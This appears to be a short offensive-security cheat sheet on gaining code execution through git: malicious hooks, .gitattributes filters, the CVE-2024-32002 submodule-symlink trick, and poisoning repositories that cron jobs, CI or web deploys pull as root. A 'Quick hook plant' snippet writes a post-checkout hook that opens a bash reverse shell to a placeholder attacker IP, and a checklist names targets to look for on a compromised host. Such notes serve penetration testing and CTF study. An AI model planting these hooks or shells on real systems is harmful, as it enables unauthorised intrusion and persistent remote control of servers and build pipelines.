# Git Clone RCE

## The shape of it
- [ ] Cloning or pulling an attacker-controlled repo executes repo content: hooks, clean/smudge filters from .gitattributes, or submodules pointing somewhere hostile
- [ ] CVE-2024-32002 family: submodule + symlink + case-insensitive filesystem writes a hook INTO .git/ that the clone itself executes — no user action beyond the clone

## When you find repo tooling on a box
- [ ] Cron or CI running git clone / git pull as root on a repo I can write → plant a hook: :Pb cron for the timer side
- [ ] A web app that deploys via git pull → poison the upstream repo or the local .git/hooks
- [ ] post-checkout is the reliable hook: it runs after every clone and checkout

## Quick hook plant
cat > .git/hooks/post-checkout <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<AttackerIP>/443 0>&1
EOF
chmod +x .git/hooks/post-checkout
- [ ] Hooks are NOT cloned from remotes: this works when I can write the local .git, not when I only control the repo
- [ ] When I only control the repo, the vector is submodule/symlink tricks (CVE-2024-32002) or malicious content the pipeline RUNS (build scripts, Makefiles, package.json postinstall)

## Checklist on sight
- [ ] .git readable on a web root → dump it first: :Pb discovery
- [ ] git pull in a root cron → hooks or a hostile merge
- [ ] A clone that a victim (or CI) will run → submodule case-collision
